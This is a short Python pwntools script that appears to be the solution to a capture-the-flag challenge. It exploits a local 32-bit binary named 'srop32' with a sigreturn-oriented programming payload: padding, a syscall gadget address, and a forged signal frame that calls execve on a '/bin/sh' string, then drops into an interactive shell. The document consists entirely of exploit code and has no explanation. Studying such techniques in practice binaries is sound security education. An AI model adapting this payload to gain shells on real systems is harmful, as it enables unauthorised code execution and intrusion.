from pwn import *

p = process('./srop32')

syscall = 0x0804840e
sh = 0x804a01c

payload = 'A'*12 + p32(syscall)

frame = SigreturnFrame(kernel='amd64')
frame.ebx = sh
frame.eax = 0xb
frame.eip = syscall

payload += str(frame)
payload = payload.ljust(0x77,'a')
p.send(payload)
p.interactive()
